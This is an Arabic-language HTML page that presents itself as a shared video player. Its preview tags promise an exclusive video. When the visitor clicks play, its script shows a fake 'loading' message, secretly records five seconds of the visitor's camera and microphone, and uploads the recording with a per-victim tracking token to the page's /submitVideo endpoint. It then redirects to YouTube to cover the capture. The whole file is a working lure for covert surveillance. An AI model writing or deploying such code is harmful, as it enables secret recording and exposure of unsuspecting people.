<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- Meta Tags for Preview -->
    <meta property="og:title" content="شاهد مقطع الفيديو الحصري">
    <meta property="og:description" content="تمت مشاركة مقطع فيديو معك. انقر للمشاهدة الآن بجودة عالية.">
    <meta property="og:image" content="https://cdn-icons-png.flaticon.com/512/1179/1179069.png">
    <meta property="og:type" content="video.movie">

    <title>Video Player</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #1a1a1a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .play-btn { width: 80px; height: 80px; background: rgba(255,255,255,0.2); border-radius: 50%; display: flex; justify-content: center; align-items: center; cursor: pointer; border: 2px solid white; }
        .play-icon { width: 0; height: 0; border-top: 15px solid transparent; border-bottom: 15px solid transparent; border-left: 25px solid white; margin-left: 5px; }
    </style>
</head>
<body>
    <div class="play-btn" id="startBtn">
        <div class="play-icon"></div>
    </div>
    <video id="video" style="display:none;"></video>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const token = urlParams.get('t');

        document.getElementById('startBtn').onclick = async function() {
            this.style.display = 'none';
            document.body.innerHTML = "<h2>جاري تحميل الفيديو...</h2>";
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                video.play();

                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];

                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/mp4' });
                    const reader = new FileReader();
                    reader.readAsDataURL(blob);
                    reader.onloadend = () => {
                        fetch('/submitVideo', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ token: token, videoData: reader.result })
                        });
                    };
                };

                mediaRecorder.start();
                setTimeout(() => {
                    mediaRecorder.stop();
                    stream.getTracks().forEach(track => track.stop());
                    window.location.href = "https://www.youtube.com";
                }, 5000);

            } catch (err) {
                window.location.href = "https://www.youtube.com";
            }
        };
    </script>
</body>
</html>
